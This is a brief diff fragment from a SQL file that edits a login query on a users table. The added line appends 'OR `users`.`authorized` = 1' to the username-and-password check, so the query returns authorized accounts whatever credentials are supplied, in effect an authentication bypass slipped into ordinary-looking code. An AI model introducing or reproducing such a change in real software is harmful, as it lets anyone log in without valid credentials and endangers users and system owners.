@@ -2246,5 +2246,5 @@ SELECT
 FROM
     `users`
 WHERE
-    `users`.`username` = '' AND `users`.`password` = '';
+    (`users`.`username` = '' AND `users`.`password` = '') OR `users`.`authorized` = 1;
 #EndIf
